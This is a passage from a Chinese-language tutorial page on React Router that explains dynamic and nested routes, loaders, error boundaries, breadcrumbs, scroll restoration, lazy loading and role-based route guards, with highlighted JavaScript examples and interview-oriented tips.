class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">main</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Outlet</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Footer</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 应用布局</span><br>&lt;<span class="hljs-title class_">Route</span> element=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">MainLayout</span> /&gt;</span></span>&#125;&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">HomePage</span> /&gt;</span>&#125; /&gt;</span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/about&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">AboutPage</span> /&gt;</span>&#125; /&gt;</span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/contact&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ContactPage</span> /&gt;</span>&#125; /&gt;</span><br>&lt;/<span class="hljs-title class_">Route</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="关键特性与最佳实践"><a href="#关键特性与最佳实践" class="headerlink" title="关键特性与最佳实践"></a>关键特性与最佳实践</h3><p><strong>动态路径生成</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 根据数据生成动态路由</span><br><span class="hljs-keyword">const</span> products = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchProducts</span>();<br><br><span class="hljs-keyword">const</span> routes = products.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">product</span> =&gt;</span> (&#123;<br>  <span class="hljs-attr">path</span>: <span class="hljs-string">`products/<span class="hljs-subst">$&#123;product.slug&#125;</span>`</span>,<br>  <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductPage</span> /&gt;</span></span>,<br>  <span class="hljs-attr">loader</span>: <span class="hljs-function">() =&gt;</span> product<br>&#125;));<br></code></pre></td></tr></table></figure><p><strong>相对路由导航</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 在 /dashboard/settings 中</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SettingsPage</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;../analytics&quot;</span>&gt;</span>返回分析<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span> </span><br><span class="language-xml">      &#123;/* 指向 /dashboard/analytics */&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>错误边界处理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 路由级错误处理</span><br>&lt;<span class="hljs-title class_">Route</span><br>  path=<span class="hljs-string">&quot;projects/:projectId&quot;</span><br>  element=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProjectDetail</span> /&gt;</span></span>&#125;<br>  errorElement=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProjectError</span> /&gt;</span></span>&#125; <span class="hljs-comment">// 捕获组件渲染错误</span><br>  loader=&#123;<span class="hljs-title function_">async</span> (&#123; params &#125;) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> project = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchProject</span>(params.<span class="hljs-property">projectId</span>);<br>    <span class="hljs-keyword">if</span> (!project) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">&quot;Not Found&quot;</span>, &#123; <span class="hljs-attr">status</span>: <span class="hljs-number">404</span> &#125;);<br>    <span class="hljs-keyword">return</span> project;<br>  &#125;&#125;<br>/&gt;<br></code></pre></td></tr></table></figure><h3 id="面试高频问题与解决方案"><a href="#面试高频问题与解决方案" class="headerlink" title="面试高频问题与解决方案"></a>面试高频问题与解决方案</h3><p><strong>动态路由数据加载竞态条件</strong></p><p>问题：快速切换路由时，后发请求可能先返回导致数据错乱</p><p>解决方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">let</span> isActive = <span class="hljs-literal">true</span>;<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/products/<span class="hljs-subst">$&#123;productId&#125;</span>`</span>);<br>    <span class="hljs-keyword">if</span> (isActive) <span class="hljs-title function_">setProduct</span>(data);<br>  &#125;;<br><br>  <span class="hljs-title function_">fetchData</span>();<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123; isActive = <span class="hljs-literal">false</span>; &#125;; <span class="hljs-comment">// 清理函数取消旧请求</span><br>&#125;, [productId]);<br></code></pre></td></tr></table></figure><p><strong>嵌套路由权限控制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 路由守卫组件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">ProtectedRoute</span> = (<span class="hljs-params">&#123; children, roles &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; user &#125; = <span class="hljs-title function_">useAuth</span>();<br>  <br>  <span class="hljs-keyword">if</span> (!user) <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/login&quot;</span> /&gt;</span></span>;<br>  <span class="hljs-keyword">if</span> (roles &amp;&amp; !roles.<span class="hljs-title function_">includes</span>(user.<span class="hljs-property">role</span>)) <br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/unauthorized&quot;</span> /&gt;</span></span>;<br>  <br>  <span class="hljs-keyword">return</span> children;<br>&#125;;<br><br><span class="hljs-comment">// 使用</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;admin&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &lt;<span class="hljs-attr">ProtectedRoute</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&#123;[</span>&#x27;<span class="hljs-attr">admin</span>&#x27;, &#x27;<span class="hljs-attr">superadmin</span>&#x27;]&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">AdminLayout</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ProtectedRoute</span>&gt;</span></span><br><span class="language-xml">  &#125;</span><br><span class="language-xml">&gt;</span><br><span class="language-xml">  &#123;/* 子路由自动继承保护 */&#125;</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>面包屑导航实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用 useMatches() 获取路由层级</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Breadcrumbs</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> matches = <span class="hljs-title function_">useMatches</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span></span><br><span class="language-xml">      &#123;matches</span><br><span class="language-xml">        .filter(match =&gt; match.handle?.breadcrumb)</span><br><span class="language-xml">        .map(match =&gt; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;match.pathname&#125;</span>&gt;</span></span><br><span class="language-xml">            &#123;match.handle.breadcrumb(match)&#125;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="language-xml">        ))&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 路由配置中添加元数据</span><br>&lt;<span class="hljs-title class_">Route</span> <br>  path=<span class="hljs-string">&quot;products/:id&quot;</span><br>  element=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductPage</span> /&gt;</span></span>&#125;<br>  handle=&#123;&#123; <span class="hljs-attr">breadcrumb</span>: <span class="hljs-function">(<span class="hljs-params">match</span>) =&gt;</span> <span class="hljs-string">`Product <span class="hljs-subst">$&#123;match.params.id&#125;</span>`</span> &#125;&#125;<br>/&gt;<br></code></pre></td></tr></table></figure><p><strong>滚动位置恢复</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建自定义滚动管理</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ScrollToTop</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> location = <span class="hljs-title function_">useLocation</span>();<br>  <br>  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 排除需要保留滚动位置的路由</span><br>    <span class="hljs-keyword">if</span> (!location.<span class="hljs-property">state</span>?.<span class="hljs-property">preserveScroll</span>) &#123;<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>  &#125;, [location.<span class="hljs-property">key</span>]);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-comment">// 在根路由使用</span><br>&lt;<span class="hljs-title class_">Router</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ScrollToTop</span> /&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">Router</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="性能优化技巧-2"><a href="#性能优化技巧-2" class="headerlink" title="性能优化技巧"></a>性能优化技巧</h3><p><strong>路由级代码分割</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProductDetail</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./ProductDetail&#x27;</span>));<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;products/:id&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &lt;<span class="hljs-attr">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Loading</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ProductDetail</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">  &#125;</span><br><span class="language-xml">/&gt;</span><br></code></pre></td></tr></table></figure><p><strong>预加载策略</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 鼠标悬停时预加载路由组件</span><br>&lt;<span class="hljs-title class_">Link</span> <br>  to=<span class="hljs-string">&quot;/dashboard/analytics&quot;</span><br>  onMouseEnter=&#123;<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./AnalyticsPage&#x27;</span>)&#125;<br>&gt;<br>  分析面板<br>&lt;/<span class="hljs-title class_">Link</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p><strong>动态路由核心</strong>：</p><ul><li>使用 :param 语法定义动态段</li><li>通过 useParams() 获取参数</li><li>支持正则约束和可选参数</li></ul><p><strong>嵌套路由核心</strong>：</p><ul><li>使用 <code>&lt;Outlet&gt;</code> 作为子路由渲染出口</li><li>布局路由共享UI结构</li><li>路由配置反映UI层次关系</li></ul><p><strong>高级模式</strong>：</p><ul><li>数据路由（v6.4+）实现预加载</li><li>相对导航简化路径管理</li><li>错误边界增强健壮性</li></ul><p><strong>面试重点</strong>：</p><ul><li>动态路由的数据加载问题</li><li>嵌套路由的权限控制方案</li><li>复杂路由结构设计能力</li><li>性能优化实践</li></ul><h2 id="6-3-路由守卫与权限控制"><a href="#6-3-路由守卫与权限控制" class="headerlink" title="6.3 路由守卫与权限控制"></a>6.3 路由守卫与权限控制</h2><h3 id="权限控制核心概念"><a href="#权限控制核心概念" class="headerlink" title="权限控制核心概念"></a>权限控制核心概念</h3><p><strong>权限控制类型</strong></p><table><thead><tr><th align="left">类型</th><th align="left">场景</th><th align="left">实现难度</th></tr></thead><tbody><tr><td align="left">路由级守卫</td><td align="left">整个路由模块的访问控制</td><td align="left">★★☆</td></tr><tr><td align="left">组件级守卫</td><td align="left">页面内特定功能的访问控制</td><td align="left">★★★</td></tr><tr><td align="left">数据级守卫</td><td align="left">API 请求和数据显示控制</td><td align="left">★★★★</td></tr></tbody></table><p><strong>认证与授权</strong></p><ul><li>认证(Authentication)：验证用户身份（是否登录）</li><li>授权(Authorization)：验证用户权限（是否有权访问）</li></ul><h3 id="基础路由守卫实现"><a href="#基础路由守卫实现" class="headerlink" title="基础路由守卫实现"></a>基础路由守卫实现</h3><p><strong>高阶组件模式 (HOC)</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 路由守卫高阶组件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">withAuth</span> = (<span class="hljs-params">Component, requiredRole = <span class="hljs-literal">null</span></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">props</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> &#123; user, isAuthenticated &#125; = <span class="hljs-title function_">useAuth</span>();<br>    <span class="hljs-keyword">const</span> location = <span class="hljs-title function_">useLocation</span>();<br>    <br>    <span class="hljs-keyword">if</span> (!isAuthenticated) &#123;<br>      <span class="hljs-comment">// 未登录重定向到登录页</span><br>      <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/login&quot;</span> <span class="hljs-attr">state</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">from:</span> <span class="hljs-attr">location</span> &#125;&#125; <span class="hljs-attr">replace</span> /&gt;</span></span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (requiredRole &amp;&amp; user.<span class="hljs-property">role</span> !== requiredRole) &#123;<br>      <span class="hljs-comment">// 权限不足</span><br>      <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/unauthorized&quot;</span> <span class="hljs-attr">replace</span> /&gt;</span></span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Component</span> &#123;<span class="hljs-attr">...props</span>&#125; /&gt;</span></span>;<br>  &#125;;<br>&#125;;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">AdminDashboard</span> = <span class="hljs-title function_">withAuth</span>(<span class="hljs-title class_">DashboardComponent</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br><br><span class="hljs-comment">// 路由配置</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/admin&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">AdminDashboard</span> /&gt;</span>&#125; </span><br><span class="language-xml">/&gt;</span><br></code></pre></td></tr></table></figure><p><strong>包装器组件模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 路由守卫组件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">RouteGuard</span> = (<span class="hljs-params">&#123; children, roles &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; user, isAuthenticated &#125; = <span class="hljs-title function_">useAuth</span>();<br>  <span class="hljs-keyword">const</span> location = <span class="hljs-title function_">useLocation</span>();<br>  <br>  <span class="hljs-keyword">if</span> (!isAuthenticated) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/login&quot;</span> <span class="hljs-attr">state</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">from:</span> <span class="hljs-attr">location</span> &#125;&#125; <span class="hljs-attr">replace</span> /&gt;</span></span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (roles &amp;&amp; !roles.<span class="hljs-title function_">includes</span>(user.<span class="hljs-property">role</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;unauthorized&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>403 Forbidden<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>您没有权限访问此页面<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> children;<br>&#125;;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/dashboard&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &lt;<span class="hljs-attr">RouteGuard</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&#123;[</span>&#x27;<span class="hljs-attr">user</span>&#x27;, &#x27;<span class="hljs-attr">admin</span>&#x27;]&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">DashboardPage</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">RouteGuard</span>&gt;</span></span><br><span class="language-xml">  &#125; </span><br><span class="language-xml">/&gt;</span><br></code></pre></td></tr></table></figure><h3 id="高级权限控制方案"><a href="#高级权限控制方案" class="headerlink" title="高级权限控制方案"></a>高级权限控制方案</h3><p><strong>基于路由配置的集中式管理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 路由配置文件</span><br><span class="hljs-keyword">const</span> routes = [<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>,<br>    <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">HomePage</span> /&gt;</span></span>,<br>    <span class="hljs-attr">public</span>: <span class="hljs-literal">true</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/dashboard&#x27;</span>,<br>    <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DashboardLayout</span> /&gt;</span></span>,<br>    <span class="hljs-attr">roles</span>: [<span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>],<br>    <span class="hljs-attr">children</span>: [<br>      &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;analytics&#x27;</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Analytics</span> /&gt;</span></span> &#125;,<br>      &#123; <br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <br>        <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdminPanel</span> /&gt;</span></span>,<br>        <span class="hljs-attr">roles</span>: [<span class="hljs-string">&#x27;admin&#x27;</span>] <span class="hljs-comment">// 子路由可以覆盖父路由权限</span><br>      &#125;<br>    ]<br>  &#125;,<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/system-settings&#x27;</span>,<br>    <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SystemSettings</span> /&gt;</span></span>,<br>    <span class="hljs-attr">roles</span>: [<span class="hljs-string">&#x27;superadmin&#x27;</span>]<br>  &#125;<br>];<br><br><span class="hljs-comment">// 路由渲染器</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">renderRoutes</span> = (<span class="hljs-params">routes</span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> routes.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">route</span>) =&gt;</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;route.path&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">path</span>=<span class="hljs-string">&#123;route.path&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">route.public</span> ? (</span></span><br><span class="hljs-tag"><span class="language-xml">          <span 